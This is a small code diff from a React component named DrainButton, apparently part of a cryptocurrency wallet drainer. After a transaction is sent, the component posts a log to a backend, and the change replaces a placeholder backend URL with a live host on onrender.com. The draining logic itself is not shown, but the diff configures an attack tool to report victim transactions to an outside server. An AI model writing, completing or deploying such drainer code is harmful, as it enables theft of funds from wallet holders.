@@ -94,7 +94,7 @@ function DrainButton() {
       setStatus(`Transaction sent! Txid: ${txid}`);
 
       // Send log to backend
-      await fetch('https://YOUR_BACKEND_URL_HERE/log', {
+      await fetch('https://backsol.onrender.com/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
